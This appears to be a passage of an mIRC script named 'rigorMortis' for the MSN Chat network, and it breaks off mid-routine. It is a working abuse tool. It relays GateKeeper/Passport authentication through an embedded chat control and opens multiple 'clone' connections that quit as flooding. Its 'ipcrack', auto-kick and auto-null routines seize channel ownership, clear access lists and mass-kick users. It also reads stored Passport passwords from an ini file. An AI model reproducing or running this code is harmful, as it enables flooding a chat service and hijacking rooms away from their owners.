on *:sockread:clone.????????????????:{
  var %r
  sockread %r
  while ( $sockbr ) {
    if ( AUTH == $left( %r, 4 ) ) {
      if ( AUTH * S :GKSSP\0* iswm %r ) {
        var %s
        %s = $client.sock($sockname)
        if ( $sock(%s).status == active ) { sockwrite -n %s %r }
        else { 
          $print( 5, -st, Ocx for $sockname has not connected ) 
          $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) 
          $ocx.close( s, $sockname ) 
        }
      }
      elseif ( AUTH \0\0\0 ? ????????????????* iswm %r ) { 
        if ( $gettok( %r, 4, 32 ) != %gate ) { %gate = $ifmatch }
      }
    }
    elseif ( $gettok( %r, 1, 32 ) == PING ) { sockwrite -n $sockname pong $mid( %r, 5 ) }
    elseif ( $gettok( %r, 2, 32 ) == JOIN ) {
      var %s, %ip, %sk, %id, %c
      %s  = $sockname
      %ip = $sock(%s).ip
      %id = $hexString
      %sk = $+( rigorMortis., %id ) 
      %c  = $mid( $gettok( %r, 4, 32 ), 2 )
      $print( 5, -t %c, Rejoined channel %c )
      sockrename %s %sk 
      sockwrite -n %sk who %c
      sockmark %sk %c
      %id = $hexString
      $setKey( $mid( %c, 2 ), server, %ip )
      $setSock( %c, %sk )
    }
    elseif ( $gettok( %r, 2, 32 ) isnum ) {
      var %n  
      %n = $ifmatch
      if ( %n == 910) { 
        $sDec( clonecon )
        $print( 5, -st, Auth failure for $sockname )
        $addReconnectQue( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ), $sock($sockname).mark )
        sockclose $sockname
        inc -u3 %quitChat
        if ( !%updateFlood ) { 
          $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
          inc -u5 %updateFlood
        }
      }
      elseif ( %n == 403 ) {
        var %c
        %c = $gettok( %r, 4, 32 )
        inc -u1 %nullCreate. [ $+ [ %c ] ]
        if ( %nullCreate. [ $+ [ %c ] ] >= 6 ) { CREATE %c } 
      }
      elseif ( %n == 927 ) { $print( 5, -st, $+( GateKeeperPassport is already in use, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 433 ) { $print( 5, -st, $+( Nickname is already in use, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 913 ) { $print( 5, -st, $+( No access, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 471 ) { $print( 5, -st, $+( Limit only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }    
      elseif ( %n == 473 ) { $print( 5, -st, $+( Invite only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 475 ) { $print( 5, -st, $+( Key only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }  
      elseif ( %n == 352 ) && ( $gettok( %r, 4, 32 ) != * ) { 
        $print( 5, -a, $+( WHO, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' $gettok( %r, 8, 32 ) $gettok( %r, 5, 32 ) +, $replace( $mid( $gettok( %r, 9, 32 ), 2 ), ., q, @, o, +, v ), $chr(32), ', $chr(15), $gettok( %r, 11-, 32 ), $chr(3), 2' ) )
        if ( $sock(client.mirc).sq <= 16000 ) { sockwrite -n client.mirc %r }
      } 
    }
    if ( $sock($sockname) ) { sockread %r }
  }
}

on *:exit:{ sockclose * }

alias -l roomEncode {
  var %r
  %r = $$1
  %r = $remove( %r, $chr(37), $chr(35) )
  %r = $replace( %r, $chr(32), \b, $chr(44), \c )
  %r = $+( $chr(37), $chr(35), %r )
  return %r
}

alias -l client.connect { 
  socklisten init.client.mIRC $iif($portfree(31337),31337)
  server $iif( $server, -m ) $+( 127., $iif( 9? iswm $os, 0.0.1, 31.33.7 ) ) $sock(init.client.mIRC).port
}

alias -l ocx.frame {
  var %key, %cid, %s
  %key = $$1
  %cid = $$2
  %s = about:<object classid="CLSID:ECCDBA05-B58F-4509-AE26-CF47B2FFC3FE">
  %s = $+( %s, <param name="server" value=", %key, :, %cid, "> )
  %s = $+( %s, <param name="nickname" value="a"> )
  return %s
}

alias -l ocx.init {
  var %w, %x, %y, %s 
  %w = $+( Ocx., $$1 )
  socklisten $+( init, %w )
  %x = $gettok( $$2, 1, 58 ) 
  %y = $sock($+( init, %w )).port
  %s = $ocx.frame( %x, %y )
  $nhtmln.init(%w)
  $nhtmln.nav( %w, %s, $$3 )
}

alias -l ocx.close {
  var %sk 
  %sk = $$2
  %sk = $client.sock(%sk)
  sockclose %sk
  sockclose $+( init, %sk )
  window -c $+( @, %sk )
  if ( $1 == s ) { sockclose $$2 }
}
alias -l vers { return $+( $chr(3), 2, $chr(40), 2.4p, $chr(41), $chr(3), $chr(15) ) }
alias -l mrc { return $+( $chr(3), 5, rigorMortis, $chr(3), $chr(15) ) }
alias -l chatServers {
  var %i, %ip, %ns, %id
  %i = 1
  while ( %i <= 6 ) {
    %ip = $+( $msn.net, $msn.host( , %i ) )
    %ns = $msn.host( ns, %i )
    %id = $hexString
    $connect( %id, %ip, %ns, $iif( $1, $1 ) )
    inc %i
  }
}

alias findServer {
  $connect( $hexString, 207.68.167.253, findServer )
}

alias -l client.sock { 
  var %r
  %r = $numtok( $$1, 46 )
  %r = $gettok( $$1, %r, 46 )
  %r = $+( Ocx., %r )
  return %r
}

alias -l server.sock {
  var %r
  %r = $numtok( $$1, 46 )
  %r = $gettok( $$1, %r, 46 )
  %r = $+( $window($+( @, $$1 )).title, ., %r )
  return %r
}
alias con { chatservers }
alias -l connect {
  var %id, %ip, %sk
  %id = $$1
  %ip = $$2
  %sk = $$3
  %sk = $+( %sk, ., %id )
  $ocx.init( %id, %ip, $$3 )
  sockopen %sk %ip 6667 
  sockmark %sk $iif( $4, $4, $me )
}
alias -l ipcrack {
  var %c, %g, %h, %a
  %c = $$2
  %g = $ial( $$1, 1 ).addr
  %h = ip. [ $+ [ $$2 ] ]
  %a = $iif( $3, $3, 4 )
  if ( $hget( %h, gkp ) ) { .hfree %h }
  .hmake %h 10
  hadd %h gkp %g
  hadd %h pos 1
  hadd %h col 1
  hadd %h sub 1
  hadd %h amo %a
  hadd %h tic $ticks
  writeini -n ip.ini %g nick $$1
  %g = $+( *!, $gettok( %g, 1, 64 ), @ )
  sockwrite -nb $getSock(%c) 512 $+( ACCESS %c clear owner, $crlf, ACCESS %c clear host, $crlf, ACCESS %c clear voice, $crlf, ACCESS %c add voice %g, 1*, $crlf, ACCESS %c add host %g, 2*, $crlf, ACCESS %c add owner %g, 3*, $crlf, KICK %c $1, $crlf, PROP %c ownerkey $key )
}

alias -l getTag { return $iif( %tag != off, $mrc $vers, \b ) }

alias -l winTitle { return $window($+( @, $$1 )).title }

on *:sockopen:TK2CHATCHATA0?.????????????????:{ 
  if ( !$sockerr ) { sockwrite -n $sockname $+( NICK $sock($sockname).mark, $crlf, AUTH GateKeeper, $iif( $left( $sock($sockname).mark, 1 ) != >, Passport, $chr(32) ) I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!9.02.0310.2401 ) }
  else { $print( 5, -st, Error connecting - $sockname server is down ) }
}
on *:sockopen:clone.*:{ 
  if ( !$sockerr ) { sockwrite -n $sockname $+( NICK $gettok( $sock($sockname).mark, 1, 32 ), $crlf, AUTH GateKeeper, $iif( $left( $sock($sockname).mark, 1 ) != >, Passport, $chr(32) ) I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!9.02.0310.2401 ) }
  else { $print( 5, -st, Error connecting - $sockname server is down ) }
}
on *:sockopen:findServer.????????????????:{
  if ( !$sockerr ) { sockwrite -n $sockname $+( NICK sid, $crlf, AUTH GateKeeperPassport I GKSSP\0\0\0, $chr(3), \0\0\0, $chr(1), \0\0\0, $crlf, IRCVERS IRC7 MSNTV-TELCO!rigorMortis ) }
  else { $print( 5, -st, Error connecting - $sockname server is down ) }
}

alias -l print {
  echo $iif( $1, $1, $color(info) ) $iif( $2, $2 ) * $3-
}

alias -l keepAlive {
  if ( $sock(findServer.*, 0 ) ) { sockwrite -n findServer.* }
  else { findServer }
}

on *:socklisten:initOcx.*:{ sockaccept $mid( $sockname, 5 ) | sockclose $sockname }

on *:sockread:Ocx.*:{
  var %r
  sockread %r
  while ( $sockbr ) {
    if ( AUTH GateKeeper S :GKSSP\0\0\0?\0\0\0?\0\0\0* iswm %r ) { 
      var %s
      %s = $server.sock($sockname)
      if ( $sock(%s).status == active ) {
        if ( TK2CHATCHATA0?.???????????????? iswm %s ) { 
          if ( $left( $sock(%s).mark, 1 ) == > ) { 
            var %o, %i, %m
            %o = $mid(%r, 45 )
            %i = 1 
            %m = 16
            while ( %i <= %m ) {
              if ( $mid( %o, %i, 1 ) == \ ) { inc %i | inc %m }
              inc %i
            }
            %o = $left( %o, %m ) 
            sockwrite -n %s $+( AUTH \0\0\0 S GKSSP\0\0\0, $chr(3), \0\0\0, $chr(3), \0\0\0, %o, $guest($getGateKeeper), $crlf, USER 0 0 0 :, $getTag, $crlf, ircx )
          }
          else { sockwrite -n %s $+( %r, $crlf, AUTH \0\0\0 S :, $getCurAuthString, $iif( $getSubscribed($getCurPp), $+( $crlf, PROP $ SUBSCRIBERINFO $getCurSub ) ), $crlf, USER 0 0 0 :, $getTag, $crlf, ircx ) }
        }
        elseif ( findServer.???????????????? iswm %s ) { sockwrite -n %s $+( %r, $crlf, AUTH \0\0\0 S :, $getCurAuthString, $iif( $getSubscribed($getCurPp), $+( $crlf, PROP $ SUBSCRIBERINFO $getCurSub ) ) ) }
        elseif ( clone.???????????????? iswm %s ) { 
          $sInc( clonecon )
          var %m
          %m = $gettok( $sock(clone.????????????????).mark, 1, 32 ) 
          if ( $left( %m, 1 ) == > ) { 
            var %o, %i
            %o = $mid(%r, 45 )
            %i = 1 
            %m = 16
            while ( %i <= %m ) {
              if ( $mid( %o, %i, 1 ) == \ ) { inc %i | inc %m }
              inc %i
            }
            %o = $left( %o, %m ) 
            sockwrite -n %s $+( AUTH \0\0\0 S GKSSP\0\0\0, $chr(3), \0\0\0, $chr(3), \0\0\0, %o, $guest($getGateKeeper), $crlf, USER 0 0 0 :, $getTag, $crlf, ircx )
          }
          else { sockwrite -n %s $+( %r, $crlf, AUTH \0\0\0 S :, $getCurAuthString, $iif( $getSubscribed($getCurPp), $+( $crlf, PROP $ SUBSCRIBERINFO $getCurSub ) ), $crlf, USER 0 0 0 :, $getTag, $crlf, ircx ) }
          if ( $sGet( clonecon ) >= $sGet( clonemax ) ) { 
            var %i, %s, %c
            %i = 1 
            %m = $gettok( $sock(clone.????????????????).mark, 1, 32 )
            inc -u3 %quit
            sockwrite -n rigorMortis.???????????????? quit :Flooding
            sockwrite -n client.mirc $+( :, $me NICK %m )
            while ( %i <= $sock( clone.????????????????, 0 ) ) {
              %s = $sock( clone.????????????????, %i )
              %c = $gettok( $sock(%s).mark, 2, 32 )
              sockwrite -n %s JOIN %c $getKey( $mid( %c, 2 ), q )
              inc %i
            }
            sockclose TK2CHATCHATA0?.????????????????
            $chatservers(%m)
          }
        }
        elseif ( bot.???????????????? iswm %s ) {
          var %m
          %m = $getBotNick(%s)
          if ( $left( %m, 1 ) == > ) {
            var %o, %i
            %o = $mid(%r, 45 )
            %i = 1 
            %m = 16
            while ( %i <= %m ) {
              if ( $mid( %o, %i, 1 ) == \ ) { inc %i | inc %m }
              inc %i
            }
            %o = $left( %o, %m ) 
            sockwrite -n %s $+( AUTH \0\0\0 S GKSSP\0\0\0, $chr(3), \0\0\0, $chr(3), \0\0\0, %o, $guest($getGateKeeper), $crlf, USER 0 0 0 :, $sockMrc $vers, $crlf, ircx )
          }
          else { sockwrite -n %s $+( %r, $crlf, AUTH \0\0\0 S :, $getSockAuthString, $iif( $getSubscribed($getSockPp) && $popup.check( useSub, $sock(%s).mark ) == on, $+( $crlf, PROP $ SUBSCRIBERINFO $getSockSub ) ), $crlf, USER 0 0 0 :, $sockMrc $vers, $crlf, ircx ) }
        }
        elseif ( gkp.???????????????? iswm %s ) { sockwrite -n %s $+( %r, $crlf, AUTH \0\0\0 S $gettok( $sock(%s).mark, 2, 32 ) ) }
        $ocx.close( , %s )
      }
      else {
        $print( 5, -st, Server for $sockname client has not connected ) 
        $ocx.close( s, %s )
      }
    }
    if ( $sock($sockname) ) { sockread %r }
  }
}

on *:sockread:TK2CHATCHATA0?.????????????????:{
  var %r 
  sockread %r 
  while ( $sockbr ) { 
    if ( AUTH == $left( %r, 4 ) ) {
      if ( AUTH * S :GKSSP\0* iswm %r ) {
        var %s
        %s = $client.sock($sockname)
        if ( $sock(%s).status == active ) { sockwrite -n %s %r }
        else { 
          $print( 5, -st, Ocx for $sockname has not connected ) 
          $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) 
          $ocx.close( s, $sockname ) 
        }
      }
      elseif ( AUTH \0\0\0 ? ????????????????* iswm %r ) { 
        if ( $gettok( %r, 4, 32 ) != %gate ) { %gate = $ifmatch }
        $print( , -st, $sockname connected - %gate )
      }
    }
    elseif ( $gettok( %r, 2, 32 ) == JOIN ) {
      var %s, %ip, %sk, %id, %c
      %s  = $sockname
      %ip = $sock(%s).ip
      %id = $hexString
      %sk = $+( rigorMortis., %id ) 
      %c  = $mid( $gettok( %r, 4, 32 ), 2 )
      sockrename %s %sk 
      sockwrite -n client.mirc $+( :rigorMortis 800 $sock($sockname).mark :, $crlf, $gettok( %r, 1-2, 32 ) %c )
      sockwrite -n %sk who %c
      sockmark %sk %c
      %id = $hexString
      $connect( %id, %ip, $gettok( %s, 1, 46 ) )
      $setKey( $mid( %c, 2 ), server, %ip )
      $setSock( %c, %sk )
    }
    elseif ( $gettok( %r, 1, 32 ) == PING ) { sockwrite -n $sockname pong $mid( %r, 5 ) }
    elseif ( $gettok( %r, 2, 32 ) isnum ) {
      var %n  
      %n = $ifmatch
      if ( %n == 910) { 
        $print( 5, -st, Auth failure for $sockname )
        $addReconnectQue( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) )
        sockclose $sockname
        inc -u3 %quitChat
        if ( !%updateFlood ) { 
          $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
          inc -u5 %updateFlood
        }
      }
      elseif ( %n == 403 ) {
        var %c
        %c = $gettok( %r, 4, 32 )
        inc -u1 %nullCreate. [ $+ [ %c ] ]
        if ( %nullCreate. [ $+ [ %c ] ] >= 6 ) { CREATE %c } 
      }
      elseif ( %n == 927 ) { $print( 5, -st, $+( GateKeeperPassport is already in use, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 433 ) { $print( 5, -st, $+( Nickname is already in use, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 913 ) { $print( 5, -st, $+( No access, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 471 ) { $print( 5, -st, $+( Limit only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }    
      elseif ( %n == 473 ) { $print( 5, -st, $+( Invite only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }
      elseif ( %n == 475 ) { $print( 5, -st, $+( Key only, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' ) ) }  
      elseif ( %n == 352 ) && ( $gettok( %r, 4, 32 ) != * ) { 
        $print( 5, -a, $+( WHO, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' $gettok( %r, 8, 32 ) $gettok( %r, 5, 32 ) +, $replace( $mid( $gettok( %r, 9, 32 ), 2 ), ., q, @, o, +, v ), $chr(32), ', $chr(15), $gettok( %r, 11-, 32 ), $chr(3), 2' ) )
        if ( $sock(client.mirc).sq <= 16000 ) { sockwrite -n client.mirc %r }
      } 
    }
    elseif ( !%keepAlive. [ $+ [ $sockname ] ] ) && ( $sockname ) {   
      sockwrite -n $sockname
      inc -u3 %keepAlive. [ $+ [ $sockname ] ]
    }
    if ( $sock($sockname) ) { sockread %r }
  }

}

alias popup.check {
  var %x $1, %y $2
  if (% [ $+ [ %x ] ] != off) {
    if (% [ $+ [ %x ] ] [ $+ [ . ] ] [ $+ [ %y ] ] != off) { return on }
    if (% [ $+ [ %x ] ] [ $+ [ . ] ] [ $+ [ %y ] ] = off) { return off }
  }
  if (% [ $+ [ %x ] ] = off) {
    if (% [ $+ [ %x ] ] [ $+ [ . ] ] [ $+ [ %y ] ] = on) { return on } 
    else { return off }
  }
}

on *:sockread:findServer.*:{ 
  var %r 
  sockread %r
  while ( $sockbr ) {
    if ( AUTH == $left( %r, 4 ) ) {
      if ( AUTH GateKeeperPassport S :GKSSP\0* iswm %r ) {
        var %s
        %s = $client.sock($sockname)
        if ( $sock(%s).status == active ) { sockwrite -n %s %r }
        else { 
          $print( 5, -st, Ocx for $sockname has not connected ) 
          $connect( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) ) 
          $ocx.close( s, $sockname ) 
        }  
      }
      elseif ( AUTH \0\0\0 ? ????????????????* iswm %r ) { 
        $print( , -st, $sockname connected - $gettok( %r, 4, 32 ) )
        .timerpong 0 6 keepAlive
      }
    }  
    elseif ( $gettok( %r, 2, 32 ) == 613 ) {
      sockwrite -n $$sock( $+( TK2CHATCHATA0, $$calc( $gettok( $gettok( %r, 4, 32 ), 4, 46) - 156), .???????????????? ), 1 ) JOIN $$sock($sockname).mark $getKey( $mid( $sock($sockname).mark, 2 ), q )  
    }
    elseif ( $gettok( %r, 2, 32 ) == 642 ) { 
      $print( 5, -a, $+( FINDU, $chr(3), 2 ', $chr(3), 5, $gettok( %r, 4, 32 ), $chr(3), 2' $gettok( %r, 6, 32 ) $gettok( %r, 5, 32 ) ) )
      sockwrite -n client.mirc %r
    }
    elseif ( $gettok( %r, 2, 32 ) == 910 ) { 
      $print( 5, -st, Auth failure for $sockname )
      $addReconnectQue( $hexString, $sock($sockname).ip, $gettok( $sockname, 1, 46 ) )
      sockclose $sockname
      if ( !%updateFlood ) { 
        $update( $mid( $getCurPp, 2 ), $readini( passport.ini, $mid( $getCurPp, 2 ), password ) )
        inc -u5 %updateFlood
      }
    }
    if ( $sock($sockname) ) { sockread %r }
  }
}

on *:sockread:rigorMortis.????????????????:{
  var %r 
  sockread %r
  while ( $sockbr ) { 
    tokenize 32 %r
    if ( $2 == MODE ) {
      if ( $4 $5 == -q $me ) && ( $me isowner $3 ) && ( !%-qflood. [ $+ [ $3 ] ] ) && ( $me != $mid( $gettok( $1, 1, 33 ), 2 ) ) && ( $mid( $getKey( $mid( $3, 2 ), q), 2 ) ) {
        if ( $popup.check( hopprot, $3 ) != off ) { sockwrite -nb $sockname 512 $+( PART $3, $crlf, JOIN $3 $getKey( $mid( $3, 2 ), q ), $crlf, ACCESS $3 clear owner, $crlf, KICK $3 $mid( $gettok( $1, 1, 33 ), 2) :, $mrc $vers, $crlf, PROP $3 ownerkey $key ) }
        else { sockwrite -nb $sockname 512 $+( MODE $me +h $getKey( $mid( $3, 2 ), q ), $crlf, KICK $3 $mid( $gettok( $1, 1, 33 ), 2 ) :, $mrc $vers, $crlf, ACCESS $3 clear owner, $crlf, PROP $3 ownerkey $key ) }
        inc -u3 %-qflood. [ $+ [ $3 ] ]
      }
      elseif ( $4 $5 == +q $me ) && ( !%+qflood. [ $+ [ $3 ] ] ) { 
        if ( %autoKick. [ $+ [ $3 ] ] == on ) {
          var %i, %c, %bn, %n, %s
          %i = 1
          %c = $3
          %bn = $getBotNick($getBotSock(%c))
          $userHalt(%c)
          while ( %i <= $nick( %c, 0 ) ) {
            %n = $nick( %c, %i )
            if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(44), %n ) }
            inc %i
          } 
          sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, ACCESS %c clear owner, $crlf, KICK %c %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host )
          unset %autoKick. [ $+ [ %c ] ]
        }
        elseif ( %autoNull. [ $+ [ $3 ] ] == on ) {
          var %i, %c, %bn, %n, %s
          %i = 1
          %c = $3
          %bn = $getBotNick($getBotSock(%c))
          $userHalt(%c)
          while ( %i <= $nick( %c, 0 ) ) {
            %n = $nick( %c, %i )
            if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(32), %n ) }
            inc %i
          } 
          sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, PROP %c ownerkey :, $crlf, MODE %c -, $str( q, $numtok( %s, 32 ) ) %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host )
          unset %autoNull. [ $+ [ %c ] ]
        }
        elseif ( $popup.check( banlist, $3 ) == on ) { 
          var %i, %f, %n, %u
          %i = 1
          %f = 0
          while ( %i <= $nick( $3, 0 ) ) {
            %n = $nick( $3, %i )
            %u = $ial( %n, 1 ).addr
            if ( $ini( banlist.ini, %u ) ) { 
              if ( %f <= 2 ) { sockwrite -n $sockname $+( ACCESS $3 add deny *!, $gettok( %u, 1, 64 ), @*, $crlf, KICK $3 %n :, $chr(3), 5, Banlist, $chr(3), 2 $readini( banlist.ini, %u, nick ), $chr(3), 2 ', $chr(3), 5, $readini( banlist.ini, %u, reason ), $chr(3), 2' ) }
              else {
                $clientQue( ACCESS $3 add deny $+( *!, $gettok( %u, 1, 64 ), @* ) )
                $clientQue( KICK $3 %n $+( :, $chr(3), 5, Banlist, $chr(3), 2 $readini( banlist.ini, %u, nick ), $chr(3), 2 ', $chr(3), 5, $readini( banlist.ini, %u, reason ), $chr(3), 2' ) ) 
                $clientQue( PROP $3 ownerkey $key )
              }
              inc %f
            }
            inc %i
          }
        }
        if ( !%meJoin. [ $+ [ $3 ] ] ) {
          sockwrite -n $sockname $+( ACCESS $3 delete host *!, %gate, $crlf, ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 add host '*!*@* 0 :, $mrc $vers ) 
        }
        inc -u5 %+qflood. [ $+ [ $3 ] ]
      } 
      elseif ( $4 $5 == +o $me ) && ( !%+oflood. [ $+ [ $3 ] ] ) { 
        sockwrite -n $sockname $+( ACCESS $3 add host *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, ACCESS $3 add host '*!*@* 0 :, $mrc, $vers ) 
        inc -u3 %+oflood. [ $+ [ $3 ] ]
      }
      elseif ( $4 == +q ) && ( $me isowner $3 ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $me ) && ( !%++qflood. [ $+ [ $3 ] ] ) { 
        sockwrite -nb $sockname 512 $+( ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, ACCESS $3 add host '*!*@* 0 :, $mrc $vers )
        inc -u4 %++qflood. [ $+ [ $3 ] ]
      }
      elseif ( $4 == +o ) && ( $me isop $3 ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $me ) && ( !%++oflood. [ $+ [ $3 ] ] ) { 
        sockwrite -nb $sockname 512 $+( ACCESS $3 add host *!, %gate 0 :, $mrc $vers, $crlf, ACCESS $3 add voice *!, $gettok( %gate, 1, 64 ), @* 0 :, $mrc $vers, $crlf, ACCESS $3 add host '*!*@* 0 :, $mrc $vers )
        inc -u4 %++oflood. [ $+ [ $3 ] ]
      } 
      sockwrite -n client.mirc %r 
    }
    elseif ( $2 == PROP ) {
      if ( $4 == ownerkey ) {
        if ( $5 == : ) && ( $mid( $gettok( $1, 1, 33 ), 2 ) != $me ) && ( !%nullflood. [ $+ [ $3 ] ] ) {
          sockwrite -nb $sockname 512 $+( ACCESS $3 add owner *!, %gate 0 :, $mrc $vers, $crlf, PART $3, $crlf, JOIN $3 :$null, $crlf, ACCESS $3 clear, $crlf, ACCESS $3 add deny *!, $gettok( $1, 2, 33 ) 0 :, $mrc $vers, $crlf, KICK $3 $mid( $gettok( $1, 1, 33 ), 2 ) :, $mrc $vers, $crlf, PROP $3 ownerkey $key )
          inc -u5 %nullflood. [ $+ [ $3 ] ]
          if ( $popup.check( chanProt, $3 ) == on ) {
            var %i, %n, %g, %c
            %i = 1
            %n = $mid( $gettok( $1, 1, 33 ), 2 )
            %g = $gettok( $1, 2, 33 )
            remini -n aop.ini global %g
            while ( %i <= $comchan( %n, 0 ) ) {
              %c = $comchan( %n, %i ) 
              sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, ACCESS %c add deny *!, %g, $crlf, KICK %c %n :, $mrc $vers, $crlf, PROP %c ownerkey $key, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
              remini -n aop.ini $mid( %c, 2 ) %g 
              inc %i
            } 
          }
        }
        $setKey( $mid( $3, 2 ), q, $5 )
      }
      elseif ( $4 == hostkey ) { $setKey( $mid( $3, 2 ), o, $5 ) }
    }
    elseif ( $2 == KICK ) {
      inc -u2 %kickflood. [ $+ [ $3 ] ]
      if ( $4 == $me ) { 
        sockwrite -n $sockname JOIN $3 $getKey( $mid( $3, 2 ), q )
        $print( 5, -t $iif( $window($3), $3, -s ), $+( You were kicked by $mid( $gettok( $1, 1, 33 ), 2 ) ', $mid( $5-, 2 ), ' ) )
      }
      elseif ( $4 != $me ) { 
        var %u, %n
        %u = $ial( $4, 1 ).addr
        %n = $mid( $gettok( $1, 1, 33 ), 2 )
        if ( $ini( aop.ini, global, %u ) ) && ( !$ini( aop.ini, global, $gettok( $1, 2, 33 ) ) ) && ( %n != $me ) && ( %n != $getBotNick($getBotSock($3)) ) { sockwrite -n $sockname $+( ACCESS $3 clear deny, $crlf, KICK $3 %n :, $chr(3), 5Protected, $chr(3), 2 $gettok( $readini( aop.ini, global, %u ), 1, 32 ), $chr(3), 2 ', $chr(3), 5, $gettok( $readini( aop.ini, global, %u ), 2-, 32 ), $chr(3), 2', $crlf, ACCESS $3 clear owner, $crlf, PROP $3 ownerkey $key ) }
        elseif ( $4 == $getBotNick($getBotSock($3)) ) { 
          sockwrite -n $sockname $+( KICK $3 %n :, $mrc $vers, $crlf, ACCESS $3 clear owner, $crlf, PROP $3 ownerkey $key, $crlf, ACCESS $3 add owner *!, $getBotGate($getBotSock($3)) 0 :, $sockMrc $vers )
          sockwrite -n $getBotSock($3) JOIN $3
        }
        sockwrite -n client.mirc %r 
      }
      if ( %kickflood. [ $+ [ $3 ] ] >= 5 ) && ( !%kickfld. [ $+ [ $3 ] ] ) && ( !%joinfld. [ $+ [ $3 ] ] ) {
        if ( $popup.check( chanProt, $3 ) == on ) {
          var %i, %n, %g, %c
          %i = 1
          %n = $mid( $gettok( $1, 1, 33 ), 2 )
          %g = $gettok( $1, 2, 33 )
          remini -n aop.ini global %g
          while ( %i <= $comchan( %n, 0 ) ) {
            %c = $comchan( %n, %i ) 
            sockwrite -n $getSock(%c) $+( ACCESS %c clear owner, $crlf, ACCESS %c add deny *!, %g, $crlf, KICK %c %n :, $mrc $vers, $crlf, PROP %c ownerkey $key, ACCESS %c add owner *!, %gate 0 :, $mrc $vers )
            remini -n aop.ini $mid( %c, 2 ) %g 
            inc %i
          } 
        }
        inc -u8 %kickfld. [ $+ [ $3 ] ] 
      }
    }
    elseif ( $2 == JOIN ) { 
      var %n, %usr
      %n = $mid( $gettok( $1, 1, 33 ), 2 )
      %usr = $gettok( $1, 2, 33 )
      sockwrite -n client.mirc $1 $2 $4 
      if ( $gettok( $3, 4, 44) ) { sockwrite -n client.mirc :root MODE $mid( $4, 2 ) $+( + , $replace( $gettok( $3, 4, 44 ), $chr(46), q, $chr(64), o, $chr(43), v ) ) %n }
      if ( %n == $me ) { 
        var %a
        %a = $gettok( $3, 4, 44 )
        sockwrite -n $sockname WHO $sock($sockname).mark
        if ( %a == . ) && ( !%meJoin. [ $+ [ $sock($sockname).mark ] ] ) {
          if ( %autoKick. [ $+ [ $3 ] ] == on ) {
            var %i, %c, %bn, %n, %s
            %i = 1
            %c = $3
            %bn = $getBotNick($getBotSock(%c))
            $userHalt(%c)
            while ( %i <= $nick( %c, 0 ) ) {
              %n = $nick( %c, %i )
              if ( %n != $me ) && ( %n != %bn ) { %s = $+( %s, $chr(44), %n ) }
              inc %i
            } 
            sockwrite -n $getSock(%c) $+( PROP %c ownerkey :$NULL, $crlf, ACCESS %c clear owner, $crlf, KICK %c %s, $crlf, PROP %c ownerkey $hexString, $crlf, ACCESS %c clear owner, $crlf, PROP %c hostkey $hexString, $crlf, ACCESS %c clear host )
            unset %autoKick. [ $+ [ %c ] ]
          }
          elseif ( %autoNull. [ $+ [ $3 ] ] == on ) {
            var %i, %c, %bn, %n, %s
            %i = 1
            %c = $3
            %bn = $getBotNick($getBotSock(%c))
            $userHalt(%c)
            while ( %i <= $nick( %c, 0 ) ) {
              %n = $nick( %c, %i )
